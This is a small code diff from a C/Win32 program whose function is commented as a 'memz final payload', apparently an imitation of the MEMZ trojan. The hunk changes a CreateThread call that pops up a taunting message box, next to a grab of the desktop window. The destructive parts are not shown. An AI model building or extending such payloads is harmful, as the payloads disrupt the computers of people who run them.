@@ -35,7 +35,7 @@ int p2() { //memz final payload but random
         msg.lpszText = "bet you regret that now huh";
         msg.lpszCaption = "ez";
         msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
-        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, 0, &dwID);
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);
 
 
         HWND desktop = GetDesktopWindow();
